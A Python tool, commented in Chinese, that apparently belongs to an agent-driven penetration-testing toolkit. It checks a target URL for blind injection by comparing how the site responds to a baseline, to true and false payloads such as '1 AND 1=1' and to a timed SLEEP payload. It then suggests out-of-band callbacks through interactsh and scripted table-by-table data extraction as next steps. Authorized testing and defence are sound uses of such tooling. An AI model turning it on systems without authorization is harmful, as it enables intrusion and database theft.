#!/usr/bin/env python3
"""v4.8 W6 盲注三通道自动裁决器（布尔/时延/带外建议）——单变量差分，仅存在性证明。

机制：给定基线请求与 true/false payload 对，自动完成：
  ① 布尔通道：true vs false vs 基线 的响应长度/内容哈希差分（真值与假值必须彼此可区分，
     且 false 与基线一致——排除「payload 本身改变响应形态」的假信号）；
  ② 时延通道：true payload 多次测量取中位数，与基线中位数比，阈值判定（三重测取中位数，
     scan-tiering 噪声感知协议口径）；
  ③ 带外通道：本工具不外联——输出 OOB 回连建议（interactsh/自建接收器，loop-core 纪律 5），
     由 agent 人工执行后回填。
裁决输出 JSON（verdict: boolean_true / time_true / inconclusive / not_injectable）+ 下一步建议。

用法：
  python3 blind-inject-adjudicator.py --url 'http://t/item?id={}' \
      --true-payload "1 AND 1=1" --false-payload "1 AND 1=2" --param id [--cookie k=v ...]
  python3 blind-inject-adjudicator.py --selftest
合规：只读探测请求（GET），不投递破坏性载荷；判定为「存在性证明」，深度利用走对应技能剧本。
"""
import argparse, hashlib, json, statistics, time
import urllib.request, urllib.error, urllib.parse

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 chain-adjudicator/1.0"

def fetch(url, cookies=None, timeout=15, method="GET", body=None):
    req = urllib.request.Request(url, data=body.encode() if body else None, method=method)
    req.add_header("User-Agent", UA)
    if cookies:
        req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in cookies.items()))
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.read(), resp.status, time.monotonic()
    except urllib.error.HTTPError as e:
        return e.read(), e.code, time.monotonic()
    except Exception:
        return b"", 0, time.monotonic()

def timed_fetch(url, cookies=None, timeout=15):
    t0 = time.monotonic()
    data, status, _ = fetch(url, cookies=cookies, timeout=timeout)
    return data, status, time.monotonic() - t0

def measure(url_tpl, payload, cookies, repeats=3):
    """对模板 URL 以 payload 替换 {} 后重复测量 → (中位时延, 首次响应指纹)。payload 做 URL 编码。"""
    quoted = urllib.parse.quote(payload, safe="")
    times, sig = [], None
    for _ in range(repeats):
        data, status, dt = timed_fetch(url_tpl.format(quoted), cookies=cookies)
        times.append(dt)
        if sig is None:
            sig = (len(data), hashlib.sha1(data).hexdigest()[:12], status)
    return statistics.median(times), sig

def adjudicate(url_tpl, true_p, false_p, cookies, base_p=None, delay_threshold=2.0):
    """三通道裁决主逻辑。base_p 为基线 payload（缺省空串）。"""
    base_p = base_p if base_p is not None else ""
    base_med, base_sig = measure(url_tpl, base_p, cookies)
    true_med, true_sig = measure(url_tpl, true_p, cookies)
    false_med, false_sig = measure(url_tpl, false_p, cookies)
    report = {"baseline": {"median_s": round(base_med, 3), "sig": base_sig},
              "true": {"median_s": round(true_med, 3), "sig": true_sig},
              "false": {"median_s": round(false_med, 3), "sig": false_sig}}
    # ②→① 时延通道优先：true 中位数显著高于基线与 false（先判时间再判布尔，防时延真值
    #    与基线同形态被误标布尔）
    if true_med - max(base_med, false_med) >= delay_threshold:
        report["verdict"] = "time_true"
        report["channel"] = "time"
        report["next"] = "时延通道成立——三重测中位数已过阈值，用 TIME= 前缀落证据（G1 门按 TIME= 归账）"
    else:
        # 布尔通道（经典口径）：true 与基线同形态，false 与 true 可区分——真/假值彼此可分辨
        # 即构成布尔预言机；false 与基线不同属正常（假值走"未找到"分支）
        # v5.1.2 P1 修复：status=0（连接失败/抖动）或无成功样本的测量不参与布尔裁决——
        # 原实现假值测量失败时 len=0≠true_len 直接伪造 boolean_true（裁决器假阳性源）。
        sigs_ok = all(s is not None and s[2] == 200 for s in (base_sig, true_sig, false_sig))
        if not sigs_ok:
            report["verdict"] = "inconclusive"
            report["channel"] = "oob_suggested"
            report["next"] = "存在 status!=200/无响应 的测量（网络抖动或拦截）——退避重测或人工对照，禁止下布尔结论"
        elif true_sig[0] == base_sig[0] and false_sig[0] != true_sig[0]:
            report["verdict"] = "boolean_true"
            report["channel"] = "boolean"
            report["next"] = "布尔通道成立——按 sqli-deep/ssti-engine-map 对应技能做逐位/逐表导出（脚本化批量）"
        else:
            report["verdict"] = "inconclusive"
            report["channel"] = "oob_suggested"
            report["next"] = ("布尔/时延均不可判定——切 OOB 通道（loop-core 纪律 5：本机反链优先 interactsh-client / "
                              "自建接收器；确认后以命中记录回填 update_coverage）或换注入语义（编码/等价变体）")
    report["note"] = "存在性证明口径：本结果只证明「注入面存在性」，不构成可利用性确证（exploitability 需实测回写）"
    return report

def selftest():
    """本地 canned 服务闭环：布尔通道/时延通道/不可判定 三分支（零外联）。"""
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    class Up(BaseHTTPRequestHandler):
        def do_GET(self):
            from urllib.parse import urlparse, parse_qs, unquote
            qid = unquote(parse_qs(urlparse(self.path).query).get("id", [""])[0])
            if "SLEEP" in qid:
                body, delay = b"item-0000-0000", 0.6          # 时延真值：形态同基线但慢
            elif "1=2" in qid or "1%3D2" in qid:
                body, delay = b"not-found-page-body-different-length", 0.05  # 假值：不同长度
            elif "NEUTRAL" in qid:
                body, delay = b"same-shape", 0.05             # 三态无差 → 不可判定
            else:
                body, delay = b"item-0000-0000", 0.05         # 基线/布尔真值同形态
            time.sleep(delay)
            self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers()
            self.wfile.write(body)
        def log_message(self, *a): pass
    up = ThreadingHTTPServer(("127.0.0.1", 0), Up); threading.Thread(target=up.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{up.server_address[1]}/item?id={{}}"
    r1 = adjudicate(base, "1 AND 1=1", "1 AND 1=2", None, delay_threshold=0.3)
    assert r1["verdict"] == "boolean_true", f"布尔通道应判定: {r1}"
    r2 = adjudicate(base, "1 AND SLEEP(5)", "1 AND 1=2", None, delay_threshold=0.3)
    assert r2["verdict"] == "time_true", f"时延通道应判定: {r2}"
    r3 = adjudicate(base, "1 NEUTRAL-A", "1 NEUTRAL-B", None, delay_threshold=0.3)
    assert r3["verdict"] == "inconclusive", f"无差形态应不可判定: {r3}"
    up.shutdown()
    print("blind-inject-adjudicator selftest: 布尔/时延/不可判定 3/3 OK")

def main():
    ap = argparse.ArgumentParser(description="v4.8 W6 盲注三通道自动裁决器")
    ap.add_argument("--url", help="URL 模板，{} 为 payload 位（如 http://t/item?id={}）")
    ap.add_argument("--true-payload", help="真值 payload")
    ap.add_argument("--false-payload", help="假值 payload")
    ap.add_argument("--param", help="参数名（仅提示性标注）")
    ap.add_argument("--cookie", action="append", default=[], help="会话态 k=v（可多次，来源 channel-snapshot）")
    ap.add_argument("--delay-threshold", type=float, default=2.0, help="时延通道阈值秒（默认 2.0）")
    ap.add_argument("--json", action="store_true", help="输出 JSON")
    ap.add_argument("--selftest", action="store_true")
    ns = ap.parse_args()
    if ns.selftest:
        selftest(); return
    if not (ns.url and ns.true_payload and ns.false_payload):
        ap.error("需要 --url + --true-payload + --false-payload（或 --selftest）")
    cookies = dict(kv.split("=", 1) for kv in ns.cookie)
    rep = adjudicate(ns.url, ns.true_payload, ns.false_payload, cookies, delay_threshold=ns.delay_threshold)
    rep["param"] = ns.param or ""
    print(json.dumps(rep, ensure_ascii=False, indent=1))

if __name__ == "__main__":
    main()
